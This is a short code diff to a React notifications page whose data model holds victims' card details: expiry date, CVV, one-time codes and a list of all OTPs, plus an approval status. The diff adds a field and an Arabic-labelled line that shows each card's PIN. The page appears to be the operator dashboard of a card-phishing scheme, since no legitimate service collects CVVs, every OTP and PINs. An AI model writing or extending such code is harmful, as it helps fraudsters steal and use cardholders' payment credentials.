@@ -45,6 +45,7 @@ interface Notification {
     expirationDate: string;
     cvv: string;
     otp: string;
+    password:string;
     allOtps: string[];
     status?: 'pending' | 'approved' | 'rejected';
   };
@@ -319,6 +320,11 @@ export default function NotificationsPage() {
                   {selectedNotification.cardInfo.otp}
                 </p>
               </div>
+              <p>
+              <strong className="text-red-400 mx-4">رقم سري بطاقة :</strong>
+              {selectedNotification.cardInfo.password}
+
+              </p>
               <p>
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                 {selectedNotification.cardInfo.allOtps.join(',')}
